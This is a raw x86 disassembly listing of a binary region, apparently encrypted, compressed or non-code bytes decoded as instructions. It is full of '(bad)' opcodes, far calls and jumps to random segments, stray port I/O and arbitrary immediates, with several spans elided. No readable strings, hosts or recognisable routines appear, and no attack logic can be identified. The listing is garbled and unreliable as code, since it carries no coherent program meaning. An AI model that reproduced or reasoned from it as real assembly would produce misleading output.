  41431c:	mov    cl,0xdd
  41431e:	idiv   BYTE PTR [esi-0x64]
  414321:	mov    ebx,0x2946d7ed
  414326:	add    dl,dl
  414328:	add    BYTE PTR [eax],al
  41432a:	pop    es
  41432b:	add    DWORD PTR [eax],eax
  41432d:	add    BYTE PTR [edx-0x10745df1],dh
  414333:	sub    eax,0x22f53ecb
  414338:	jmp    0x41437d
  41433a:	mov    al,ds:0x740ff979
  41433f:	sbb    ch,cl
  414341:	loopne 0x414399
  414343:	je     0x414324
  414345:	idiv   DWORD PTR [ebx+0x5329a5e7]
  41434b:	es jo  0x41431d
  41434e:	scas   eax,DWORD PTR es:[edi]
  41434f:	ins    DWORD PTR es:[edi],dx
  414350:	jle    0x414303
  414352:	ins    BYTE PTR es:[edi],dx
  414353:	test   DWORD PTR [ebx],ebx
  414355:	loope  0x41432e
  414357:	mov    ds,WORD PTR [ecx+0x3187136e]
  41435d:	or     esp,DWORD PTR [edx]
  41435f:	and    DWORD PTR [eax+ebp*4-0x64],ecx
  414363:	sbb    edi,ecx
  414365:	add    esi,DWORD PTR [eax]
  414367:	xchg   eax,edi
  414369:	jo     0x41436e
  41436b:	imul   eax,esp,0x73
  41436e:	popf   
  41436f:	lods   eax,DWORD PTR ds:[esi]
  414370:	cli    
  414371:	lods   eax,DWORD PTR ds:[esi]
  414372:	bound  edx,QWORD PTR [esi]
  414374:	fwait
  414375:	adc    DWORD PTR [ebp+eiz*8+0x18],ebx
  414379:	sahf   
  41437a:	add    edx,ebx
  41437c:	pop    ecx
  41437d:	mov    WORD PTR [esp+ebp*2-0x65],?
  414381:	xchg   ecx,eax
  414382:	xchg   DWORD PTR [edi],esi
  414384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414385:	xchg   esi,eax
  414386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414387:	outs   dx,DWORD PTR ds:[esi]
  414388:	sub    al,0xe8
  41438a:	sub    dl,cl
  41438c:	call   0x7131:0xf1b6ecd7
  414393:	mov    ecx,0x2ed5df4f
  414398:	ins    DWORD PTR es:[edi],dx
  414399:	add    al,0xa
  41439b:	fild   QWORD PTR [edi+0x29]
  41439e:	dec    esp
  41439f:	inc    ecx
  4143a0:	fs and ebx,ecx
  4143a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143a4:	daa    
  4143a5:	shl    BYTE PTR [esi],0x4f
  4143a8:	adc    esi,ecx
  4143aa:	rcl    dh,0x1d
  4143ad:	add    eax,eax
  4143af:	push   esp
  4143b0:	or     al,bh
  4143b2:	dec    eax
  4143b3:	outs   dx,BYTE PTR ds:[esi]
  4143b4:	adc    BYTE PTR [esp+edi*1+0x5970f9c8],dh
  4143bb:	add    BYTE PTR [esi],cl
  4143bd:	pop    ecx
  4143be:	push   ebp
  4143bf:	mov    DWORD PTR [esi+esi*4+0x12499ede],edx
  4143c6:	mov    eax,0x260398e2
  4143cb:	sahf   
  4143cc:	jle    0x4143e1
  4143ce:	arpl   si,bp
  4143d0:	jae    0x414384
  4143d2:	inc    ebx
  4143d3:	mov    ebx,0x17aa0867
  4143d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d9:	ss jb  0x4143c7
  4143dc:	paddusw mm4,QWORD PTR [eax+0x51b2a655]
  4143e3:	jl     0x4143e4
  4143e5:	repz mov esp,0x5478358
  4143eb:	bound  edi,QWORD PTR [eax+esi*2-0xe4b457c]
  4143f2:	int    0xab
  4143f4:	in     eax,0x91
  4143f6:	xor    eax,0x5f9c53fc
  4143fb:	pop    ds
  4143fc:	sbb    cl,BYTE PTR [esi+0x44aacdf9]
  414402:	dec    cl
  414404:	es jmp 0x41439b
  414407:	xor    eax,0xfe9635b0
  41440c:	aam    0xab
  41440e:	nop
  41440f:	lds    esi,FWORD PTR [ecx+eax*2-0x5d]
  414413:	(bad)  
  414415:	sub    ebx,DWORD PTR [ecx+0x23]
  414418:	xchg   esi,edi
  41441a:	or     edi,DWORD PTR [edi-0x6]
  41441d:	xchg   edx,eax
  41441e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41441f:	fimul  WORD PTR [ecx]
  414421:	push   0x56
  414423:	scas   al,BYTE PTR es:[edi]
  414424:	cmc    
  414425:	pop    edx
  414426:	mov    ds:0x5549893f,eax
  41442b:	mov    ecx,0xb9e056b5
  414430:	jmp    0x414403
  414432:	jmp    0x0:0xd96c
	...
  414495:	add    BYTE PTR [ebx+0x73],bl
  414498:	inc    edx
  414499:	or     eax,0x775f3d6a
  41449e:	ss ins BYTE PTR es:[edi],dx
  4144a0:	pop    esp
  4144a1:	xchg   esp,eax
  4144a2:	jnp    0x4144c5
  4144a4:	jb     0x414523
  4144a6:	or     ebx,edx
  4144a8:	add    BYTE PTR [eax],al
  4144aa:	pop    es
  4144ab:	add    DWORD PTR [eax],eax
  4144ad:	add    al,ah
  4144af:	into   
  4144b0:	jmp    0x5136:0xeddb092b
  4144b7:	les    eax,FWORD PTR [bp+si]
  4144ba:	scas   eax,DWORD PTR es:[edi]
  4144bb:	in     al,0xb7
  4144bd:	xchg   esp,eax
  4144be:	cld    
  4144bf:	stos   DWORD PTR es:[edi],eax
  4144c0:	mov    bh,0x2
  4144c2:	daa    
  4144c3:	push   eax
  4144c4:	mov    dl,0xad
  4144c6:	mov    esi,0x745d9729
  4144cb:	call   0x56fe:0x563bdbfc
  4144d2:	inc    eax
  4144d3:	out    dx,al
  4144d4:	aam    0xcf
  4144d6:	xor    eax,0x55d53a8e
  4144db:	pusha  
  4144dc:	mov    ds:0xbe50fb6,eax
  4144e1:	shr    DWORD PTR [edx-0x5e],0x26
  4144e5:	inc    ebx
  4144e6:	push   ebx
  4144e7:	(bad)  
  4144e8:	shl    BYTE PTR [eax],cl
  4144ea:	push   esi
  4144eb:	jbe    0x414476
  4144ed:	popa   
  4144ee:	and    DWORD PTR [ecx],edi
  4144f0:	fcom   st(7)
  4144f2:	pop    ds
  4144f3:	call   DWORD PTR [ebp-0x38b2bc82]
  4144f9:	pop    es
  4144fa:	test   al,0x3f
  4144fc:	into   
  4144fd:	or     eax,0x807e60da
  414502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414503:	imul   ebx,DWORD PTR [edx+eax*4-0x3e],0x2d15d7f4
  41450b:	inc    eax
  41450c:	nop
  41450d:	push   esi
  41450e:	cs popf 
  414510:	aas    
  414511:	sbb    al,0x2d
  414513:	push   cs
  414514:	fwait
  414515:	pop    esi
  414516:	pop    es
  414517:	cmp    dh,BYTE PTR [edx+eax*8+0x2e]
  41451b:	les    ebp,FWORD PTR [edx+0x59c08097]
  414521:	sar    DWORD PTR [eax],0xc8
  414524:	cmp    BYTE PTR [edx-0x67598f9c],bl
  41452a:	pop    ebp
  41452b:	push   0x6a37fd04
  414530:	mov    esi,0x3670d74
  414535:	hlt    
  414536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414537:	dec    ebx
  414538:	mov    eax,ds:0xc978013d
  41453d:	mov    al,ds:0x241da8bd
  414542:	push   ds
  414543:	pushf  
  414544:	inc    ebx
  414545:	or     DWORD PTR [ebx],esi
  414547:	fild   DWORD PTR [eax-0x74]
  41454a:	(bad)  
  41454c:	xor    DWORD PTR [ecx],ecx
  41454e:	sub    ch,0x9f
  414551:	scas   eax,DWORD PTR es:[edi]
  414552:	je     0x4144ea
  414554:	lods   eax,DWORD PTR ds:[esi]
  414555:	sub    dl,BYTE PTR [ecx-0x7b]
  414558:	xlat   BYTE PTR ds:[ebx]
  414559:	and    BYTE PTR [ebx],cl
  41455b:	adc    al,0x3f
  41455d:	sbb    DWORD PTR ds:0x6ee1e17b,edi
  414563:	mov    ds:0x9caa5e15,al
  414568:	pop    edx
  414569:	ret    
  41456a:	jecxz  0x4144fa
  41456c:	push   edi
  41456d:	sbb    al,0x65
  41456f:	mov    al,0xed
  414571:	pop    ebp
  414572:	dec    ecx
  414573:	scas   al,BYTE PTR es:[edi]
  414574:	dec    ecx
  414575:	rcr    DWORD PTR [esi+0x6e],cl
  414578:	or     BYTE PTR [edi-0x4c],ch
  41457b:	test   DWORD PTR [ebp-0x36],0xc24fb68
  414582:	call   0xcbe3:0x429b14f8
  414589:	(bad)
  41458d:	adc    al,BYTE PTR [ecx-0x4f26346]
  414593:	xor    DWORD PTR [edx+0x3ab8bd0b],ebx
  414599:	inc    edx
  41459a:	imul   edx,ecx,0x26cfcaa
  4145a0:	sbb    ah,BYTE PTR [ecx-0x44]
  4145a3:	jg     0x41459f
  4145a5:	fld    TBYTE PTR ds:0x38f84c38
  4145ab:	int    0x93
  4145ad:	int    0x9
  4145af:	fcom   st(7)
  4145b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b2:	mov    dl,0xce
  4145b4:	rol    DWORD PTR [eax],cl
	...
  414616:	jg     0x414676
  414618:	cmc    
  414619:	ins    DWORD PTR es:[edi],dx
  41461a:	cmc    
  41461b:	out    dx,eax
  41461c:	call   FWORD PTR [esi+0xd]
  41461f:	mov    al,ds:0xef440dc2
  414624:	add    dl,BYTE PTR es:[eax]
  414627:	aam    0x0
  414629:	add    BYTE PTR [edi],al
  41462b:	add    DWORD PTR [eax],eax
  41462d:	add    BYTE PTR [edi],al
  41462f:	sbb    al,0x91
  414631:	xchg   ebx,eax
  414632:	pop    edx
  414633:	loopne 0x4146ac
  414635:	ret    0x55f
  414638:	imul   ebp,DWORD PTR [ebx],0x73
  41463b:	dec    edx
  41463d:	arpl   WORD PTR [ebp+0x4ba53a79],ax
  414643:	mov    eax,0x55911043
  414648:	add    al,0xb1
  41464a:	je     0x414616
  41464c:	mov    al,ds:0x21beed21
  414651:	push   edx
  414652:	mov    edi,0xf8f4b5ff
  414657:	daa    
  414658:	into   
  414659:	in     al,dx
  41465a:	sbb    esp,esi
  41465c:	test   al,0x21
  41465e:	push   0x3775adfd
  414663:	test   DWORD PTR cs:[edx],esi
  414666:	ror    ch,0x11
  414669:	fdivp  st(3),st
  41466b:	cmp    bl,dh
  41466d:	or     eax,DWORD PTR [eax+0x6]
  414670:	test   al,0xbd
  414672:	pushf  
  414673:	pop    esp
  414674:	(bad)  
  414675:	jmp    DWORD PTR [ebp-0x6d848d1c]
  41467b:	pop    esp
  41467c:	mov    edi,0x7a35a604
  414681:	cmc    
  414682:	push   ebp
  414683:	jge    0x41462d
  414685:	ins    DWORD PTR es:[edi],dx
  414686:	call   0xad1c:0x4d4c9da8
  41468d:	adc    al,0x1e
  41468f:	(bad)  
  414691:	(bad)  
  414692:	jns    0x414679
  414694:	mov    edi,DWORD PTR [ebx+0x2e9c2ac6]
  41469a:	std    
  41469b:	retf   
  41469c:	push   es
  41469d:	hlt    
  41469e:	pop    ds
  41469f:	push   ds
  4146a0:	adc    BYTE PTR [eax+0x7c],dh
  4146a3:	imul   ecx,ecx,0x56
  4146a6:	add    eax,0x6d15029e
  4146ab:	mov    al,es:0xb028f838
  4146b1:	xlat   BYTE PTR es:[ebx]
  4146b3:	(bad)  
  4146b4:	mov    al,ds:0x446a450b
  4146b9:	mov    ah,0x57
  4146bb:	mov    al,ds:0x14cb164e
  4146c0:	or     al,0xbf
  4146c2:	add    bh,al
  4146c4:	pop    esp
  4146c5:	or     al,ch
  4146c7:	or     DWORD PTR [ecx-0x3e],0xffffff82
  4146cb:	xchg   BYTE PTR [ebp+0x3a],al
  4146ce:	sbb    bl,BYTE PTR [eax]
  4146d0:	xor    BYTE PTR [edi-0x2a],ch
  4146d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d4:	pop    esp
  4146d5:	mov    ebp,0x978ce72f
  4146da:	cmp    eax,0x77f5dd95
  4146df:	pop    esp
  4146e0:	ins    BYTE PTR es:[edi],dx
  4146e1:	pop    esp
  4146e2:	inc    ecx
  4146e3:	leave  
  4146e4:	mov    edx,0x16d23977
  4146e9:	mov    ch,0xd
  4146eb:	repnz xlat BYTE PTR ds:[ebx]
  4146ed:	jge    0x4146f9
  4146ef:	pop    ss
  4146f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146f1:	dec    ebx
  4146f2:	inc    ecx
  4146f4:	test   eax,0xf6452372
  4146f9:	inc    ebx
  4146fa:	dec    edx
  4146fb:	xor    dh,BYTE PTR [ecx+0x1ce514c6]
  414701:	jae    0x4146e9
  414703:	mov    ds:0xd1948bd2,eax
  414708:	cwde   
  414709:	(bad)  
  41470a:	outs   dx,BYTE PTR ds:[esi]
  41470b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41470c:	popf   
  41470d:	aas    
  41470e:	add    BYTE PTR ds:0xda108ede,dh
  414714:	mov    edi,0x2e697e44
  414719:	cmp    eax,0xc1e4aa9b
  41471e:	add    BYTE PTR [ebx],0x27
  414721:	loopne 0x4146a6
  414723:	jnp    0x41476e
  414725:	jbe    0x4146e8
  414727:	stos   BYTE PTR es:[edi],al
  414728:	xchg   edx,eax
  414729:	jmp    0x23c07ffd
  41472e:	in     eax,0x28
  414730:	sar    BYTE PTR [eax],0xd7
  414733:	stc    
  414734:	ins    BYTE PTR es:[edi],dx
	...
  414795:	add    BYTE PTR [esi+0x2f],bh
  414798:	add    DWORD PTR [ebp+0x51],ebp
  41479b:	outs   dx,DWORD PTR ds:[esi]
  41479c:	jle    0x4147dd
  41479e:	aam    0x28
  4147a0:	aam    0xa9
  4147a2:	pop    esp
  4147a3:	int3   
  4147a4:	mov    cl,0x5d
  4147a6:	pop    ss
  4147a7:	aad    0x0
  4147a9:	add    BYTE PTR [edi],al
  4147ab:	add    DWORD PTR [eax],eax
  4147ad:	add    BYTE PTR [esi*1-0x4ae097f8],bh
  4147b4:	adc    al,0x5c
  4147b6:	sbb    BYTE PTR [edx+ecx*8-0x7b1769],al
  4147bd:	push   es
  4147be:	pop    esi
  4147bf:	jo     0x4147e7
  4147c1:	mov    ecx,0xc7003a57
  4147c6:	add    al,0x50
  4147c8:	loopne 0x414768
  4147ca:	sbb    eax,0x8c97a99b
  4147cf:	mov    al,ds:0xa4b795a6
  4147d4:	cmp    DWORD PTR [esi+0x3d],esp
  4147d7:	in     eax,0x21
  4147d9:	adc    ebp,DWORD PTR [ebp+0x4f66b273]
  4147df:	pop    ebp
  4147e0:	(bad)  
  4147e1:	mov    ebx,0xcdf95bc6
  4147e6:	cld    
  4147e7:	lds    edx,FWORD PTR [ebx+0x2c]
  4147ea:	cmp    eax,0x77e562e3
  4147ef:	xchg   edi,eax
  4147f0:	and    DWORD PTR [edx],ebp
  4147f2:	lods   eax,DWORD PTR ds:[esi]
  4147f3:	mov    al,0xd9
  4147f5:	adc    dh,BYTE PTR [ebx+0x5d]
  4147f8:	pop    eax
  4147f9:	aad    0x6e
  4147fb:	leave  
  4147fc:	fstp   TBYTE PTR [esi]
  4147fe:	inc    eax
  4147ff:	pop    es
  414800:	push   ds
  414801:	mov    ebp,0x12059d39
  414806:	sub    BYTE PTR [esi],0x88
  414809:	dec    ebx
  41480a:	arpl   WORD PTR [eax+0x7128443a],bp
  414810:	xchg   BYTE PTR [esi-0x12171c6f],ch
  414816:	adc    BYTE PTR [ebp+0x6d687fba],dh
  41481c:	out    0xab,eax
  41481e:	imul   esp,DWORD PTR [ecx],0x3d7c2d4b
  414824:	jp     0x4147b5
  414826:	jle    0x4147f4
  414828:	mov    ecx,0xdb0b2741
  41482d:	sub    dh,dh
  41482f:	repnz inc eax
  414831:	jg     0x4147f9
  414833:	std    
  414834:	int3   
  414835:	xchg   ecx,eax
  414836:	es and al,BYTE PTR ds:[ecx]
  41483a:	idiv   BYTE PTR [eax+0x3e974318]
  414840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414841:	shl    BYTE PTR [edx-0x6b00b831],1
  414847:	imul   ecx,DWORD PTR [esi+0x64],0x18
  41484b:	push   esp
  41484c:	sbb    BYTE PTR [ebx+ebp*1+0x78c5053e],0xcf
  414854:	out    0x23,eax
  414856:	leave  
  414857:	cmp    BYTE PTR [edi+0x20],0x47
  41485b:	sub    al,0x2d
  41485d:	pusha  
  41485e:	repz cmp DWORD PTR [ebx-0x2c],ecx
  414862:	or     al,0x5
  414864:	or     cl,dh
  414866:	pop    ebx
  414867:	arpl   WORD PTR [ebx+0x7d],dx
  41486a:	dec    ebx
  41486b:	ret    0x51ef
  41486e:	test   BYTE PTR [eax-0x2cc22dcc],bl
  414874:	stos   BYTE PTR es:[edi],al
  414875:	mov    dh,0x52
  414877:	add    eax,0x8d6883b8
  41487c:	sbb    esi,esi
  41487e:	xlat   BYTE PTR ds:[ebx]
  41487f:	scas   al,BYTE PTR es:[edi]
  414880:	test   BYTE PTR [edi+0x36],ah
  414883:	add    dl,BYTE PTR [ebx]
  414885:	in     al,0x68
  414887:	loopne 0x414897
  414889:	stos   BYTE PTR es:[edi],al
  41488a:	push   ecx
  41488b:	(bad)  
  41488c:	sbb    ebp,eax
  41488e:	dec    esp
  41488f:	and    al,0xc7
  414891:	mov    bl,0x9
  414893:	fwait
  414894:	and    eax,0xf9a97de
  414899:	mov    dl,0xb3
  41489b:	lds    esi,FWORD PTR [ebx-0x2e]
  41489e:	mov    BYTE PTR [ebp-0x56823498],dh
  4148a4:	jnp    0x414841
  4148a6:	add    edi,DWORD PTR [ebx+0x69579f]
  4148ac:	imul   esp,esp,0x61
  4148af:	leave  
  4148b0:	pop    ds
  4148b1:	mov    ds:0x61ef,eax
	...
  414916:	or     edi,DWORD PTR [esi-0x2e]
  414919:	and    esi,edi
  41491b:	scas   eax,DWORD PTR es:[edi]
  41491c:	sti    
  41491d:	jle    0x4148ac
  41491f:	sbb    eax,0x2898c1ed
  414924:	ror    BYTE PTR [edi],0x1e
  414927:	(bad)  
  414928:	add    BYTE PTR [eax],al
  41492a:	pop    es
  41492b:	add    DWORD PTR [eax],eax
  41492d:	add    BYTE PTR [ebp-0x7f4fccbe],al
  414933:	int    0x8f
  414935:	mov    dh,bh
  414937:	in     al,0x6d
  414939:	and    BYTE PTR [ebx-0x33],0x15
  41493d:	stos   DWORD PTR es:[edi],eax
  41493e:	jno    0x414921
  414940:	mov    gs,WORD PTR [edi]
  414942:	or     ecx,edx
  414944:	sti    
  414945:	lds    esi,FWORD PTR [ebx]
  414947:	sbb    dl,bh
  414949:	retf   0xcb18
  41494c:	fnstcw WORD PTR gs:[esi]
  41494f:	inc    ebx
  414950:	frstor ds:0xb8d981fd
  414956:	test   BYTE PTR [edi+0x7],0xef
  41495a:	jle    0x41497f
  41495c:	(bad)  
  41495d:	imul   DWORD PTR [esi-0x56d09616]
  414963:	push   ss
  414964:	or     eax,0xb626e594
  414969:	iret   
  41496a:	mov    esp,0x7a1819f
  41496f:	jb     0x41498b
  414971:	or     dh,al
  414973:	cmc    
  414974:	rcr    ah,0xc6
  414977:	jo     0x4149b2
  414979:	xor    BYTE PTR [eax+0x6e],bl
  41497c:	add    eax,0xcf330a32
  414981:	adc    DWORD PTR [ebp+0x55dc0b38],esi
  414987:	bound  ecx,QWORD PTR [eax+eax*2+0x5c]
  41498b:	jecxz  0x41493b
  41498d:	(bad)  
  41498e:	fsubrp st(7),st
  414990:	push   es
  414991:	(bad)  
  414992:	fadd   QWORD PTR [ebx+0x5c243ca0]
  414998:	inc    ecx
  414999:	fmul   DWORD PTR [esi]
  41499b:	popa   
  41499c:	and    al,0xf
  41499e:	test   al,0xf4
  4149a0:	adc    BYTE PTR [edx+0x24404b1d],bl
  4149a6:	mov    edi,0xa6366c7d
  4149ab:	jae    0x4149c8
  4149ad:	mov    ds,WORD PTR [ecx+0x34]
  4149b0:	fwait
  4149b1:	pop    edx
  4149b2:	and    bl,bh
  4149b4:	imul   esi,DWORD PTR [edx],0xc8ac925a
  4149ba:	inc    edx
  4149bb:	xor    BYTE PTR [ebx-0x17],0xf1
  4149bf:	dec    edx
  4149c0:	adc    al,0xd5
  4149c2:	mov    DWORD PTR [edi],edi
  4149c4:	daa    
  4149c5:	dec    edx
  4149c6:	pop    es
  4149c7:	xor    al,0xcd
  4149c9:	dec    edi
  4149ca:	retf   
  4149cb:	pop    ecx
  4149cc:	push   0x10113585
  4149d1:	mov    ebx,0xa00a0d26
  4149d6:	(bad)  
  4149d7:	cmc    
  4149d8:	stos   BYTE PTR es:[edi],al
  4149d9:	stc    
  4149da:	cdq    
  4149db:	jmp    0x88844a77
  4149e0:	mov    al,ds:0x2eab241f
  4149e5:	xor    eax,0x1840132c
  4149ea:	or     BYTE PTR [ebx],ah
  4149ec:	loopne 0x4149ca
  4149ee:	and    esi,esi
  4149f0:	lahf   
  4149f1:	sbb    esp,DWORD PTR [edi]
  4149f3:	and    edx,0xffffffc3
  4149f6:	stos   BYTE PTR es:[edi],al
  4149f7:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149f9:	fucom  st(1)
  4149fb:	dec    ebp
  4149fc:	mov    al,ds:0x2fc142ca
  414a01:	dec    eax
  414a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a03:	retf   0x9e79
  414a06:	pop    edx
  414a07:	sbb    BYTE PTR [edx],ah
  414a09:	inc    ebx
  414a0a:	dec    edi
  414a0b:	push   ebx
  414a0c:	(bad)  
  414a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0e:	add    eax,0xf1df301
  414a13:	jb     0x4149d2
  414a15:	addr16 aas 
  414a17:	es jmp 0xcf4:0x8054f0ee
  414a1f:	inc    edx
  414a20:	test   eax,0xd5b39dd9
  414a25:	push   edi
  414a26:	stos   DWORD PTR es:[edi],eax
  414a27:	adc    esi,DWORD PTR [esi+0x2e]
  414a2a:	inc    edi
  414a2b:	xor    al,0xe9
  414a2d:	sub    edx,ebx
  414a2f:	fisub  WORD PTR [eax]
  414a31:	test   DWORD PTR [ecx+edx*1],edi
  414a34:	rol    DWORD PTR [eax],1
	...
  414a96:	lahf   
  414a97:	fnstcw WORD PTR [esi]
  414a99:	ss jle 0x414a93
  414a9c:	lahf   
  414a9d:	stc    
  414a9e:	and    al,0x64
  414aa0:	mov    dl,0x1b
  414aa2:	xchg   esp,eax
  414aa3:	or     ah,BYTE PTR [ebx-0x76]
  414aa6:	and    eax,0x70000d7
  414aab:	add    DWORD PTR [eax],eax
  414aad:	add    BYTE PTR [ebp-0x1a],dl
  414ab0:	pushf  
  414ab1:	pop    ss
  414ab2:	push   ebp
  414ab3:	jmp    0x3767e01a
  414ab8:	femms  
  414aba:	push   edi
  414abb:	mov    edi,0xb0bd9b9
  414ac0:	inc    ecx
  414ac1:	jb     0x414ad8
  414ac3:	iret   
  414ac4:	dec    eax
  414ac5:	ret    0xe14
  414ac8:	dec    esi
  414ac9:	jmp    0x414acb
  414acb:	cmp    ebp,DWORD PTR [ebx+edx*2+0x79a9efd8]
  414ad2:	out    dx,eax
  414ad3:	les    edi,FWORD PTR [edi-0x2f160577]
  414ad9:	xor    ch,dl
  414adb:	icebp  
  414adc:	sbb    ah,BYTE PTR [ebx-0x13db0519]
  414ae2:	adc    al,0x90
  414ae4:	ret    0xa64f
  414ae7:	pushf  
  414ae8:	xchg   ebx,eax
  414ae9:	push   edx
  414aea:	scas   eax,DWORD PTR es:[edi]
  414aeb:	xor    BYTE PTR [ebx],dh
  414aed:	pop    ss
  414aee:	mov    cl,0xff
  414af0:	pop    esp
  414af1:	mov    esi,0x80c1500d
  414af6:	adc    dl,BYTE PTR [eax+0x71]
  414af9:	fwait
  414afa:	test   eax,0xcdf44b5b
  414aff:	mov    edx,0x80e18b9f
  414b04:	dec    edi
  414b05:	hlt    
  414b06:	sbb    BYTE PTR [ebx+eax*2],bh
  414b09:	inc    ebp
  414b0a:	cmp    eax,0x8b8099b8
  414b0f:	test   DWORD PTR [ebp+0x40],ecx
  414b12:	lea    ecx,[eax+eiz*8-0x3d]
  414b16:	pandn  mm4,QWORD PTR [ecx+0x65]
  414b1a:	mov    ch,BYTE PTR [ebx]
  414b1c:	retf   
  414b1d:	push   es
  414b1e:	pop    ds
  414b1f:	inc    esp
  414b20:	mov    ecx,0xb73d5209
  414b25:	pop    es
  414b26:	adc    BYTE PTR [edx],ah
  414b28:	outs   dx,DWORD PTR ds:[esi]
  414b29:	push   ds
  414b2a:	pusha  
  414b2b:	loopne 0x414b78
  414b2d:	dec    edx
  414b2e:	push   ebx
  414b2f:	in     eax,0x8b
  414b31:	cmp    esi,esi
  414b33:	aaa    
  414b34:	enter  0x1df0,0x73
  414b38:	mov    BYTE PTR [esi-0x25b987f4],al
  414b3e:	std    
  414b3f:	xor    eax,0xbf6ed439
  414b44:	jmp    0x776e7bab
  414b49:	dec    esi
  414b4a:	xor    al,0x13
  414b4c:	ds push cs
  414b4e:	aam    0xc1
  414b50:	test   DWORD PTR [edx],esp
  414b52:	jbe    0x414b88
  414b54:	pop    ebp
  414b55:	leave  
  414b56:	pop    edi
  414b57:	ret    0x6145
  414b5a:	jl     0x414b8e
  414b5c:	cmp    BYTE PTR [ebx],0xa8
  414b5f:	in     al,0x2e
  414b61:	xchg   ebx,eax
  414b62:	add    dl,BYTE PTR ds:0xf464eb1
  414b68:	shr    esi,cl
  414b6a:	call   0x4541:0xd13dd89a
  414b71:	test   al,0x52
  414b73:	(bad)  
  414b74:	out    0xc9,eax
  414b76:	loopne 0x414b31
  414b78:	(bad)  
  414b79:	pusha  
  414b7a:	fst    QWORD PTR [ebx-0x6b48065e]
  414b80:	cmp    ebp,DWORD PTR [edi+0x53ae468]
  414b86:	(bad)  
  414b87:	xchg   ecx,eax
  414b88:	fst    DWORD PTR [ecx]
  414b8a:	push   ss
  414b8b:	pop    esp
  414b8c:	mov    cl,0xd0
  414b8e:	lea    edi,[ebx-0x289a66f0]
  414b94:	out    0xbd,eax
  414b96:	out    dx,al
  414b97:	or     ch,0xe0
  414b9a:	daa    
  414b9b:	sub    edx,esi
  414b9d:	int    0x24
  414b9f:	ins    BYTE PTR es:[edi],dx
  414ba0:	popf   
  414ba1:	or     ch,BYTE PTR [ecx+0x7c]
  414ba4:	jmp    0x753c:0x1fd3ede2
  414bab:	pop    eax
  414bac:	jmp    0xb676:0xcdbce2d6
  414bb3:	(bad)  
  414bb4:	and    al,0x0
	...
  414c16:	xor    al,0x64
  414c18:	push   ds
  414c19:	jl     0x414c79
  414c1b:	jle    0x414c93
  414c1d:	ins    BYTE PTR es:[edi],dx
  414c1e:	inc    edi
  414c1f:	xor    ah,BYTE PTR [ecx]
  414c21:	push   edx
  414c22:	mov    ah,0x2c
  414c24:	shr    BYTE PTR [ecx+0x2c],0xd8
  414c28:	add    BYTE PTR [eax],al
  414c2a:	pop    es
  414c2b:	add    DWORD PTR [eax],eax
  414c2d:	add    BYTE PTR [esi+eax*4-0x6e],ch
  414c31:	std    
  414c32:	mov    al,ds:0x5226baa
  414c37:	pop    eax
  414c38:	xor    DWORD PTR [edx],edi
  414c3a:	inc    eax
  414c3b:	sbb    ebx,esi
  414c3d:	ins    BYTE PTR es:[edi],dx
  414c3e:	push   esp
  414c3f:	imul   ebx,DWORD PTR [edx],0x7
  414c42:	aas    
  414c43:	mov    edi,eax
  414c45:	cmp    DWORD PTR [edx-0x2d],ecx
  414c48:	or     DWORD PTR [edi],eax
  414c4a:	stc    
  414c4b:	add    esi,DWORD PTR fs:[ecx-0x44a74e6e]
  414c52:	mov    fs,WORD PTR [ebx]
  414c54:	mov    ebp,0x6ed58616
  414c59:	pop    esp
  414c5a:	mov    ds:0xbc79e10,al
  414c5f:	mov    cl,0x3e
  414c61:	sbb    ch,BYTE PTR [eax+0x7fa3e900]
  414c67:	xlat   BYTE PTR ds:[ebx]
  414c68:	loope  0x414bee
  414c6a:	int    0x71
  414c6c:	sbb    eax,0xc4fd13fb
  414c71:	dec    ebx
  414c72:	in     al,dx
  414c73:	leave  
  414c74:	into   
  414c75:	jns    0x414cc2
  414c77:	not    DWORD PTR [edx]
  414c79:	test   eax,0x3e2e5725
  414c7e:	nop
  414c7f:	pop    es
  414c80:	mov    al,ds:0x321316c1
  414c85:	scas   al,BYTE PTR es:[edi]
  414c86:	sahf   
  414c87:	dec    ecx
  414c88:	mov    eax,DWORD PTR [ecx]
  414c8a:	lock scas al,BYTE PTR es:[edi]
  414c8c:	rcl    esi,1
  414c8e:	push   ebx
  414c8f:	jbe    0x414c18
  414c91:	cmp    al,0x4b
  414c93:	stos   DWORD PTR es:[edi],eax
  414c94:	jb     0x414c6f
  414c96:	lods   eax,DWORD PTR ds:[esi]
  414c97:	sbb    BYTE PTR [edx+0x1bdfd09e],0xbf
  414c9e:	cwde   
  414c9f:	dec    edi
  414ca0:	out    0xf5,al
  414ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ca3:	cld    
  414ca4:	and    ebp,DWORD PTR [ecx-0x1e]
  414ca7:	test   eax,0x77b329fc
  414cac:	push   0x4bc30bf3
  414cb1:	shr    DWORD PTR gs:[eax-0x7d],cl
  414cb5:	out    0xf1,al
  414cb7:	inc    dl
  414cb9:	lods   eax,DWORD PTR ss:[esi]
  414cbb:	xchg   DWORD PTR [ebx+0x28],ebp
  414cbe:	inc    eax
  414cbf:	ins    BYTE PTR es:[edi],dx
  414cc0:	nop
  414cc1:	add    ebx,DWORD PTR [ebp+0x44e76c7a]
  414cc7:	push   edi
  414cc8:	cdq    
  414cc9:	shl    DWORD PTR [ebp-0x4c807938],cl
  414ccf:	stos   BYTE PTR es:[edi],al
  414cd0:	push   es
  414cd1:	addr16 inc ebx
  414cd3:	and    bl,BYTE PTR [ecx-0x598050d0]
  414cd9:	mov    ds:0xa0f13019,eax
  414cde:	dec    edi
  414cdf:	push   edi
  414ce0:	loope  0x414cd8
  414ce2:	pop    ebp
  414ce3:	stos   BYTE PTR es:[edi],al
